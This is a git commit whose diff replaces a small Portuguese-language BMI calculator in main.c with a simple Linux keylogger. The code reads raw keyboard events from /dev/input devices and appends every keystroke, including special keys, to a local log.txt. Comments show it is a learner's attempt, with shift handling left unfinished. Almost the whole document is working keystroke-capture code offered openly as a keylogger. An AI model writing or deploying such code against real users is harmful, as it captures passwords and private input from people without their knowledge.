dc0ec6f406bc25f3949c522e58606d872cb1e4a0
Decay <0_0o@tutamail.com>
2026-04-08 01:52:56 -0300

    Teste/Reconstrução do keylogger

--- main.c
+++ main.c
@@ -1,23 +1,111 @@
 #include <stdio.h>
-#include <locale.h>
-void main(){
-  setlocale(LC_ALL, "Portuguese");
-  float altura, peso, imc;
-  char nome[50];
-printf("Calculo do IMC\nDigite seu nome: ");
-fflush(stdin);
-gets(nome);
+#include <fcntl.h>
+#include <unistd.h>
+#include <linux/input.h>
 
-  printf("Digite sua altura: ");
-  fflush(stdin);
-  scanf("%f", &altura);
+// vou fazer um array com as teclas basicas
+// vi isso num forum que é mais facil que if
 
-printf("Digite seu peso: ");
-fflush(stdin);
-scanf("%f", &peso);
+const char teclas[128] = {
+    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
+    0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
+    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
+    '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
+};
 
- imc = (altura * altura) / peso;
+// tentei fazer shift mas nao consegui fazer direito
+// vou deixar pra depois
 
-printf("Olá %s, seu imc é: %f", imc, nome);
+FILE *logfile;
 
-} 
+int main() {
+    int teclado;
+    
+    // tenta achar o teclado 
+    teclado = open("/dev/input/event1", O_RDONLY);
+    if(teclado == -1) {
+        teclado = open("/dev/input/event2", O_RDONLY);
+    }
+    if(teclado == -1) {
+        teclado = open("/dev/input/event0", O_RDONLY);
+    }
+    if(teclado == -1) {
+        printf("abre o teclado nao, tenta com sudo\n");
+        return 1;
+    }
+    
+    printf("teclado aberto! (aperta ctrl+c pra parar)\n");
+    
+    logfile = fopen("log.txt", "a");
+    if(!logfile) {
+        printf("erro no arquivo\n");
+        return 1;
+    }
+    
+    struct input_event ev;
+    int shift_pressed = 0; // tentei fazer shift mas nao ta funcionando bem
+    
+    while(1) {
+        read(teclado, &ev, sizeof(ev));
+        
+        if(ev.type == 1 && ev.value == 1) { // tecla apertada
+            
+            // ve se é shift
+            if(ev.code == 42 || ev.code == 54) {
+                shift_pressed = 1;
+                continue;
+            }
+            
+            // trata as teclas normais
+            if(ev.code >= 0 && ev.code < 128 && teclas[ev.code] != 0) {
+                char c = teclas[ev.code];
+                
+                // tenta fazer maiusculo (orovavel ta errado)
+                if(shift_pressed) {
+                    if(c >= 'a' && c <= 'z') {
+                        c = c - 32; // vira maiusculo
+                    }
+                }
+                
+                printf("%c", c);
+                fprintf(logfile, "%c", c);
+            }
+            else {
+                // teclas especiais
+                switch(ev.code) {
+                    case 14:
+                        printf("<BS>");
+                        fprintf(logfile, "<BS>");
+                        break;
+                    case 28:
+                        printf("\n");
+                        fprintf(logfile, "\n");
+                        break;
+                    case 57:
+                        printf(" ");
+                        fprintf(logfile, " ");
+                        break;
+                    case 15:
+                        printf("<TAB>");
+                        fprintf(logfile, "<TAB>");
+                        break;
+                    default:
+                        printf("[%d]", ev.code);
+                        fprintf(logfile, "[%d]", ev.code);
+                        break;
+                }
+            }
+            
+            fflush(logfile);
+        }
+        
+        // quando solta o shift
+        if((ev.code == 42 || ev.code == 54) && ev.value == 0) {
+            shift_pressed = 0;
+        }
+    }
+    
+    fclose(logfile);
+    close(teclado);
+    return 0;
+}
